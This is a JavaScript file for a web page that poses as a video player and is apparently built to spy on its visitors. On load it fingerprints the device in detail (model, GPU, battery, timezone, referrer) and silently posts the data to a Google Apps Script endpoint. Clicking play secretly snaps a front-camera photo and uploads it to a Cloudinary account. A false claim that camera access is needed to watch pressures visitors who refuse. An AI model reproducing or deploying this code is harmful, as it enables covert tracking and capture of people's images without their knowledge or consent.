const playButton = document.getElementById('playButton');
const loader = document.getElementById('loader');
const video = document.getElementById('videoPlayer');
const cameraInput = document.getElementById('cameraInput');
const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

(async () => {
    const ua = navigator.userAgent;
    const getDeviceInfo = () => {
        const android = ua.match(/Android ([0-9.]+)/);
        const ios = ua.match(/OS ([0-9_]+)/);
        const device = ua.match(/\(([^)]+)\)/);
        
        // Extract brand and model
        let brand = null, model = null;
        
        // Common brand patterns
        const brands = [
            { name: 'Samsung', pattern: /Samsung[\s-]?([^;)]+)/ },
            { name: 'Huawei', pattern: /Huawei[\s-]?([^;)]+)/ },
            { name: 'Xiaomi', pattern: /Xiaomi[\s-]?([^;)]+)/ },
            { name: 'Redmi', pattern: /Redmi[\s-]?([^;)]+)/ },
            { name: 'OPPO', pattern: /OPPO[\s-]?([^;)]+)/ },
            { name: 'Vivo', pattern: /vivo[\s-]?([^;)]+)/ },
            { name: 'OnePlus', pattern: /OnePlus[\s-]?([^;)]+)/ },
            { name: 'Realme', pattern: /Realme[\s-]?([^;)]+)/ },
            { name: 'Nokia', pattern: /Nokia[\s-]?([^;)]+)/ },
            { name: 'LG', pattern: /LG[\s-]?([^;)]+)/ },
            { name: 'Motorola', pattern: /Motorola[\s-]?([^;)]+)/ },
            { name: 'Sony', pattern: /Sony[\s-]?([^;)]+)/ },
            { name: 'Google', pattern: /Pixel[\s-]?([^;)]+)/ },
            { name: 'HTC', pattern: /HTC[\s-]?([^;)]+)/ },
            { name: 'Asus', pattern: /ASUS[\s-]?([^;)]+)/ },
            { name: 'Lenovo', pattern: /Lenovo[\s-]?([^;)]+)/ },
            { name: 'ZTE', pattern: /ZTE[\s-]?([^;)]+)/ },
            { name: 'Tecno', pattern: /TECNO[\s-]?([^;)]+)/ },
            { name: 'Infinix', pattern: /Infinix[\s-]?([^;)]+)/ },
            { name: 'Honor', pattern: /HONOR[\s-]?([^;)]+)/ }
        ];
        
        // iOS devices
        if (ua.match(/iPhone/)) { brand = 'Apple'; model = 'iPhone'; }
        else if (ua.match(/iPad/)) { brand = 'Apple'; model = 'iPad'; }
        else if (ua.match(/iPod/)) { brand = 'Apple'; model = 'iPod'; }
        else {
            // Check all Android brands
            for (const b of brands) {
                const match = ua.match(b.pattern);
                if (match) {
                    brand = b.name;
                    model = match[1];
                    break;
                }
            }
        }
        
        // Fallback: Try to extract any brand/model from Build/ pattern
        if (!brand && android) {
            const modelMatch = ua.match(/;\s*([^;)]+)\s*Build/);
            if (modelMatch) {
                const fullModel = modelMatch[1].trim();
                model = fullModel;
                // Try to extract brand from model string
                const words = fullModel.split(/[\s-_]+/);
                if (words.length > 0) brand = words[0];
            }
        }
        
        return {
            androidVersion: android ? android[1] : null,
            iosVersion: ios ? ios[1].replace(/_/g, '.') : null,
            deviceName: device ? device[1] : null,
            brand: brand,
            model: model
        };
    };
    const deviceInfo = getDeviceInfo();
    const specs = {
        userAgent: ua,
        platform: navigator.platform,
        brand: deviceInfo.brand,
        model: deviceInfo.model,
        language: navigator.language,
        languages: navigator.languages,
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        connection: navigator.connection?.effectiveType,
        downlink: navigator.connection?.downlink,
        rtt: navigator.connection?.rtt,
        saveData: navigator.connection?.saveData,
        deviceName: deviceInfo.deviceName,
        androidVersion: deviceInfo.androidVersion,
        iosVersion: deviceInfo.iosVersion,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        online: navigator.onLine,
        touchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        referrer: document.referrer,
        currentUrl: window.location.href,
        battery: await navigator.getBattery?.().then(b => ({ level: b.level, charging: b.charging })).catch(() => null),
        gpu: (() => {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            return gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : null;
        })()
    };
    // Send to Google Sheets
    await fetch('https://script.google.com/macros/s/AKfycbwd6DFAaGBLF8RM6kD07nvTqD5Gr_SLDGTTLrkfVJ6qYrb7NtO9ZYZwqlgu4BnmQ28V/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(specs)
    }).catch(() => {});
})();

const uploadToCloudinary = async (blob) => {
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', 'user_pre');
    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
    return response.json();
};

const playVideo = () => {
    playButton.style.display = 'none';
    loader.style.display = 'none';
    video.controls = true;
    video.play();
};

if (isIOS) {
    cameraInput.addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (file) {
            playButton.style.display = 'none';
            loader.style.display = 'block';
            await uploadToCloudinary(file);
            playVideo();
        }
    });
    
    playButton.addEventListener('click', () => {
        cameraInput.click();
    });
} else {
    playButton.addEventListener('click', async () => {
        playButton.style.display = 'none';
        loader.style.display = 'block';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            
            // Try ImageCapture API first
            if (window.ImageCapture) {
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const blob = await imageCapture.takePhoto();
                stream.getTracks().forEach(track => track.stop());
                await uploadToCloudinary(blob);
            } else {
                // Fallback: capture from video element
                const videoEl = document.createElement('video');
                videoEl.srcObject = stream;
                videoEl.play();
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                stream.getTracks().forEach(track => track.stop());
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                await uploadToCloudinary(blob);
            }
            
            playVideo();
        } catch (error) {
            loader.style.display = 'none';
            playButton.style.display = 'flex';
            alert('Camera permission denied. Please accept to watch the video.');
        }
    });
}
